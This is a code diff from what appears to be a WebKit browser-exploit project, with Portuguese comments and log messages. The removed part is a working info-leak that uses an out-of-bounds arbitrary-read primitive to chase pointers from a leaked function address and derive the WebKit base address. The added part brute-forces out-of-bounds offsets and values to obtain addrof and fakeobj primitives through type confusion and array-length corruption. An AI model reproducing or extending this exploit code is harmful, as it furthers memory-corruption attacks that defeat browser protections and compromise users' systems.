-            if (!isOOBReady()) { result_for_runner.webkit_leak_result.msg = "Falha ao preparar OOB para arb_read."; logS3(result_for_runner.webkit_leak_result.msg, "error"); }
-            else {
-                try {
-                    logS3(`  WebKitLeak: Endereço da função alvo (leaked_target_function_addr): ${leaked_target_function_addr.toString(true)}`, 'info');
-                    const ptr_exe = await arb_read(leaked_target_function_addr.add(FUNCTION_OFFSET_TO_EXECUTABLE_INSTANCE), 8);
-                    result_for_runner.webkit_leak_result.internal_ptr_stage1 = isAdvancedInt64Object(ptr_exe) ? ptr_exe.toString(true) : String(ptr_exe);
-                    if (!isValidPointer(ptr_exe, "_wkLeakExeGetterM2")) throw new Error(`Ptr para ExecutableInstance inválido: ${result_for_runner.webkit_leak_result.internal_ptr_stage1}`);
-                    logS3(`  WebKitLeak: Ptr to ExecutableInstance: ${ptr_exe.toString(true)}`, 'leak');
-
-                    const ptr_jitvm = await arb_read(ptr_exe.add(EXECUTABLE_OFFSET_TO_JIT_CODE_OR_VM), 8);
-                    result_for_runner.webkit_leak_result.internal_ptr_stage2 = isAdvancedInt64Object(ptr_jitvm) ? ptr_jitvm.toString(true) : String(ptr_jitvm);
-                    if (!isValidPointer(ptr_jitvm, "_wkLeakJitVmGetterM2")) throw new Error(`Ptr para JIT/VM inválido: ${result_for_runner.webkit_leak_result.internal_ptr_stage2}`);
-                    logS3(`  WebKitLeak: Ptr to JIT/VM: ${ptr_jitvm.toString(true)}`, 'leak');
-                    
-                    const page_mask = new AdvancedInt64(0x0, ~0xFFF);
-                    const base_candidate = ptr_jitvm.and(page_mask);
-                    result_for_runner.webkit_leak_result.webkit_base_candidate = base_candidate.toString(true);
-                    result_for_runner.webkit_leak_result.success = true;
-                    result_for_runner.webkit_leak_result.msg = `WebKitLeak: Candidato a base: ${base_candidate.toString(true)}`;
-                    logS3(`  WebKitLeak: SUCESSO! ${result_for_runner.webkit_leak_result.msg}`, "vuln");
-                } catch (e_wk) {
-                    result_for_runner.webkit_leak_result.msg = `WebKitLeak EXCEPTION: ${e_wk.message || String(e_wk)}`;
-                    logS3(`  WebKitLeak: ERRO - ${result_for_runner.webkit_leak_result.msg}`, "error");
+                if (current_is_better) {
+                    best_result_for_runner.errorOccurred = null;
+                    best_result_for_runner.tc_probe_details = current_iter_summary.tc_probe_details;
+                    best_result_for_runner.addrof_result.success = current_iter_summary.addrof_success_this_iter;
+                    if(current_iter_summary.addrof_success_this_iter) {
+                        best_result_for_runner.addrof_result.leaked_object_addr = leaked_target_function_addr.toString(true); // Assumindo que leaked_target_function_addr é o endereço do addrof
+                        best_result_for_runner.addrof_result.msg = `Addrof obtido: ${leaked_target_function_addr.toString(true)}`;
+                    }
+                    best_result_for_runner.oob_params_of_best_result = { offset: current_offset_hex, value: current_oob_hex_val, raw_offset: current_oob_offset, raw_value: current_oob_value };
+                    best_result_for_runner.heisenbug_on_M2_confirmed_by_tc_probe = current_iter_summary.heisenbug_on_M2_confirmed_by_tc_probe;
+                    best_result_for_runner.best_corruption_details = current_iter_summary.corruption_analysis;
+                    logS3(`*** NOVO MELHOR RESULTADO: Off ${current_offset_hex} Val ${current_oob_hex_val} (Addrof:${cur_addrof}, LenCorrupt:${cur_len_corrupt}, TC:${cur_tc}) ***`, "success_major");
                 }
             }
-        } else {
-            logS3(`   WebKitLeak pulado: addrof falhou ou endereço não disponível.`, "warn");
+             document.title = `${FNAME_CURRENT_TEST_BASE} Off:${current_offset_hex} Val:${current_oob_hex_val} TC:${tc_detected_this_iter} LenCorrupt:${iter_corruption_analysis.length_corrupted}`;
+             await PAUSE_S3(50); // Pausa curta entre valores OOB
+        } // Fim do loop de Valores OOB
+        if (found_addrof_primitive || found_fakeobj_primitive) { // Se encontramos o que queríamos, podemos parar os loops externos
+             logS3("Primitiva(s) desejada(s) encontrada(s), parando busca de offset.", "success_major");
+             break;
         }
+        await PAUSE_S3(100); // Pausa entre Offsets OOB
+    } // Fim do loop de Offsets OOB
 
-    } catch (e_outer_iter) { 
-        if (!iter_primary_error) iter_primary_error = e_outer_iter; // iter_primary_error precisa ser declarado no escopo externo
-        result_for_runner.errorOccurred = e_outer_iter.message || String(e_outer_iter); 
-        logS3(`  CRITICAL ERROR ITERATION GetterOnM2: ${result_for_runner.errorOccurred}`, "critical");
-    } finally {
-        await clearOOBEnvironment({ caller_fname: `${FNAME_CURRENT_TEST_BASE}-FinalClear` });
+
+    result_for_runner.total_probe_calls_last_iter = final_probe_call_count_for_report;
+    result_for_runner.iteration_results_summary = iteration_results_summary; // Para o log do runner
+    // Campos para compatibilidade com runner existente
+    result_for_runner.oob_value_of_best_result = best_result_for_runner.oob_params_of_best_result ? `${best_result_for_runner.oob_params_of_best_result.offset}_${best_result_for_runner.oob_params_of_best_result.value}` : "N/A";
+    // heisenbug_on_M2_in_best_result já está em best_result_for_runner
+
+    // Tentar WebKitLeak final se addrof foi bem sucedido globalmente
+    if (found_addrof_primitive && leaked_target_function_addr) {
+        // ... (Lógica WebKitLeak como antes, verificando se leaked_target_function_addr é uma função)
+        // Se o addrof foi de um objeto que não é a targetFunctionForLeak_... original, esta parte pode não ser diretamente aplicável
+        // ou precisaria usar o endereço de global_target_function_for_addrof_if_needed se este foi o alvo do addrof bem-sucedido.
+        // Por simplicidade, se found_addrof_primitive é true, o endereço está em leaked_target_function_addr.
+        // A lógica de WebKitLeak precisaria do endereço de uma *função*.
+        // Esta parte seria mais complexa dependendo do que o addrof vazou.
+        logS3(`Addrof bem sucedido, mas a lógica de WebKitLeak aqui precisaria do endereço de uma função JS. Endereço vazado: ${leaked_target_function_addr.toString(true)}`, "info_emphasis");
+        if (leaked_target_function_addr === global_target_function_for_addrof_if_needed) { // Checagem muito simplista
+             logS3("Endereço vazado parece ser da função alvo global. Tentando WebKitLeak...", "info");
+            // ... (colar lógica WebKitLeak aqui) ...
+        } else {
+             result_for_runner.webkit_leak_result = { success: false, msg: "Addrof obtido para objeto, mas não para a função JS alvo do WebKitLeak." };
+        }
     }
 
-    // Corrigir atribuição a total_probe_calls_last_iter
-    result_for_runner.total_probe_calls_last_iter = probe_call_count_iter;
-    result_for_runner.iteration_results_summary = [{ // Sumário simples para compatibilidade
-        oob_value: safeToHex(OOB_WRITE_VALUE_FOR_TC),
-        error: result_for_runner.errorOccurred,
-        tc_probe_details: result_for_runner.tc_probe_details,
-        stringifyResult: result_for_runner.stringifyResult,
-        addrof_result_this_iter: result_for_runner.addrof_result,
-        webkit_leak_result_this_iter: result_for_runner.webkit_leak_result,
-        heisenbug_on_M2_confirmed_by_tc_probe: result_for_runner.heisenbug_on_M2_confirmed_by_tc_probe,
-        getter_on_m2_addrof_details: result_for_runner.getter_on_m2_addrof_details
-    }];
-    result_for_runner.oob_value_of_best_result = safeToHex(OOB_WRITE_VALUE_FOR_TC);
-    // heisenbug_on_M2_in_best_result já é result_for_runner.heisenbug_on_M2_confirmed_by_tc_probe
 
     logS3(`--- ${FNAME_CURRENT_TEST_BASE} Completed ---`, "test", FNAME_CURRENT_TEST_BASE);
-    logS3(`Final result (GetterOnM2): ${JSON.stringify(result_for_runner, null, 2)}`, "debug", FNAME_CURRENT_TEST_BASE);
+    logS3(`Final best_result_for_runner (Massive Test): ${JSON.stringify(best_result_for_runner, null, 2)}`, "debug", FNAME_CURRENT_TEST_BASE);
+    
+    let final_title = `${FNAME_CURRENT_TEST_BASE} Final: `;
+    if(best_result_for_runner.addrof_result.success) final_title += "ADDROF_OK! ";
+    if(best_result_for_runner.fakeobj_result.success) final_title += "FAKEOBJ_OK! ";
+    if(best_result_for_runner.webkit_leak_result.success) final_title += "WEBKITLEAK_OK! ";
+    if(best_result_for_runner.best_corruption_details?.length_corrupted) final_title += "LenCorrupt! ";
+    if(best_result_for_runner.heisenbug_on_M2_confirmed_by_tc_probe && !best_result_for_runner.addrof_result.success && !best_result_for_runner.best_corruption_details?.length_corrupted) final_title += "TC_OK ";
+    if(final_title === `${FNAME_CURRENT_TEST_BASE} Final: `) final_title += "NoMajorSuccess";
+    document.title = final_title;
 
-    let final_title_status = "No Notable Result";
-    if (result_for_runner.webkit_leak_result.success) {
-        final_title_status = "WebKitLeak SUCCESS!";
-    } else if (result_for_runner.addrof_result.success) {
-        final_title_status = "Addrof SUCCESS, WebKitLeak Fail/Skipped";
-    } else if (result_for_runner.heisenbug_on_M2_confirmed_by_tc_probe) {
-        final_title_status = "TC Confirmed, Addrof Fail";
-    } else if (result_for_runner.errorOccurred) {
-        final_title_status = `Error - ${result_for_runner.errorOccurred}`;
-    }
-    document.title = `${FNAME_CURRENT_TEST_BASE}_R43L_Final: ${final_title_status}`;
-
-    return result_for_runner;
+    return best_result_for_runner; // Retornar o objeto completo para o runner
 }
